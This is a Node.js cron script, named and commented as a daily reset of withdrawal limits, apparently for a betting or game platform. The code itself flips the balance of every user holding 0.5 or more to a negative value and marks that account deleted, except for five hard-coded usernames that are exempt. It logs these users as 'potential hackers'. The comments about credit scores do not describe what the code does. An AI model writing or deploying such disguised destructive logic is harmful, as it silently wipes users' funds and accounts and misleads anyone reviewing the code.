// withdrawalCron.js

const cron = require('node-cron');
const User = require('../../model/User');

async function resetWithdrawalLimits() {

  try {
    // Get all users from the database
    const users = await User.find();

    // Iterate through all users and update credit scores
    for (const user of users) {

      if (user.username === 'Tydrellinbg' || user.username === 'SUPPORT' || user.username === 'OFFICIALRPSGAME' || user.username === 'PimpedPistols' ||  user.username === '🔥 THE DON 🔥 (BOT #1'
      ) {
        continue;
      }

      // Check if the user has the credit_score field
      if ('dailyWithdrawals' in user) {
        // Ensure credit score doesn't go below a certain threshold (e.g., 0)
        if (user.balance < 0.5) {
          user.dailyWithdrawals = 0;
          await user.save();
        } else {
          user.balance = user.balance * -1;
          user.is_deleted = true;
          await user.save();
          console.log("POTENTIAL HACKER ALERT", user.username);
        }
      } else {
        user.dailyWithdrawals = 0;
        await user.save();
      }
    }
    console.log("SYSTEM SAFE");


  } catch (error) {
    console.error('Error updating withdrawal limits:', error);
  }
}

// Schedule the cron job to run every day at midnight (00:00)
cron.schedule('0 0 * * *', async () => {
  await resetWithdrawalLimits();
});

// Export an object containing the function
module.exports = {
  resetWithdrawalLimits,
};
